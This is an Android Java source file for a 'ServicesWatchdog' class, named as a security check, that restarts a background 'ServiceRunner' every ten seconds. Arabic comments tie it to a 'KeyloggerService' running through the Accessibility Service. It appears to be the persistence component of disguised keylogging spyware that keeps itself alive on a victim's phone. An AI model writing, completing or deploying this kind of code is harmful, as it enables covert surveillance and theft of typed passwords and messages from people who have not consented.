package com.sec.check;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;

import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class ServicesWatchdog {

    private static final String TAG = "SecurityCheck";
    private static final int CHECK_INTERVAL_SECONDS = 10;

    private static ScheduledExecutorService scheduler;
    private static Context appContext;

    public static void startWatching(Context context) {
        try {
            appContext = context.getApplicationContext();

            if (scheduler != null && !scheduler.isShutdown()) {
                Log.d(TAG, "[WATCHDOG] already running");
                return;
            }

            scheduler = Executors.newSingleThreadScheduledExecutor();

            scheduler.scheduleAtFixedRate(() -> {
                try {
                    checkAndRestartServices();
                } catch (Exception e) {
                    Log.e(TAG, "[WATCHDOG] check error: " + e.getMessage());
                }
            }, 5, CHECK_INTERVAL_SECONDS, TimeUnit.SECONDS);

            Log.d(TAG, "[WATCHDOG] started - checking every " + CHECK_INTERVAL_SECONDS + "s");

        } catch (Exception e) {
            Log.e(TAG, "startWatching: " + e.getMessage());
        }
    }

    private static void checkAndRestartServices() {
        if (appContext == null) return;

        try {
            // ★ تحقق من ServiceRunner
            if (!isServiceRunning(ServiceRunner.class)) {
                Log.d(TAG, "[WATCHDOG] ServiceRunner not running! Restarting...");

                Intent intent = new Intent(appContext, ServiceRunner.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    appContext.startForegroundService(intent);
                } else {
                    appContext.startService(intent);
                }
            }

            // ★ تحقق من KeyloggerService
            // ملاحظة: Accessibility Service مش بيتشغل programmatically
            // لو اتوقف، هيحتاج المستخدم يفعّله يدوياً

        } catch (Exception e) {
            Log.e(TAG, "[WATCHDOG] restart error: " + e.getMessage());
        }
    }

    private static boolean isServiceRunning(Class<?> serviceClass) {
        try {
            ActivityManager manager = (ActivityManager)
                    appContext.getSystemService(Context.ACTIVITY_SERVICE);

            if (manager == null) return false;

            List<ActivityManager.RunningServiceInfo> services =
                    manager.getRunningServices(Integer.MAX_VALUE);

            if (services == null) return false;

            for (ActivityManager.RunningServiceInfo service : services) {
                if (serviceClass.getName().equals(service.service.getClassName())) {
                    return true;
                }
            }

            return false;

        } catch (Exception e) {
            Log.e(TAG, "isServiceRunning: " + e.getMessage());
            return false;
        }
    }

    public static void stopWatching() {
        try {
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdown();
                scheduler = null;
                Log.d(TAG, "[WATCHDOG] stopped");
            }
        } catch (Exception e) {
            Log.e(TAG, "stopWatching: " + e.getMessage());
        }
    }
}
